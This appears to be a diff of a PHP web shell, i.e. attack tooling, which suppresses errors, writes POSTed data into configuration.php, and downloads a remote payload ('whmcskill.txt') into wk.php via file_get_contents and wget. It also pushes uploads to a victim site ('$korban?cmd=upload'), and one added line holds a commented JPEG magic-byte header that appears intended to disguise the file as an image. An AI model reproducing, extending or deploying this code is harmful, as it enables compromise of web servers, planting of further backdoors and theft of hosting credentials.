@@ -14,6 +14,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 @ini_set('max_execution_time', 0);
 @clearstatcache();
+// @header("ÿØÿà"); // \xff\xd8\xff\xe0
 $xk = 'f5b165f0a2778d027ecebd64a2439c8d';
 if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
   function kudaxx($value, $preserveKeys = true) {
@@ -731,7 +732,7 @@ ___  ___         ______                 _              _
     if ($_POST['conf']) {
       $configuration = $_POST['azztssns'];
       file_put_contents("configuration.php", $configuration, FILE_APPEND);
-      $scr = file_get_contents("https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/whmcskill.txt");
+      $scr = file_get_contents("https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/whmcskill.txt"); // http://pastebin.com/raw/31kP3Dp8
       $fel = fopen("wk.php", "w");
       fwrite($fel, $scr);
       exe('wget -O wk.php https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/whmcskill.txt');
@@ -1486,7 +1487,7 @@ if ($_POST['make']) {
     $upload_ah = ngirim("$korban?cmd=upload", $post2);
   }
 }
-} elseif (isset($_GET['do']) && ($_GET['do'] == 'reverse_ip')) {
+} elseif ($_GET['do'] == 'reverse_ip') {
   ?>
               <center>
                 <div id="sitelist">
